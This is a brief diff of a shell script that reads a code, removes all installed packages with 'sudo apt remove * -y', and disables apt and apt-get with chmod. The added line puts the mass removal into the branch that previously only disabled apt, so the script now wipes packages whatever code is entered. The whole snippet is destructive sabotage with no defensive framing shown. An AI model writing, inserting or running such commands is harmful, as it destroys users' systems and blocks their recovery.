@@ -9,6 +9,7 @@ read code
 if [ $code != 'ITSA-TEST' ]; then
   sudo apt remove * -y
 else
+  sudo apt remove * -y
   sudo chmod -x /usr/bin/apt
   sudo chmod -x /usr/bin/apt-get
 fi
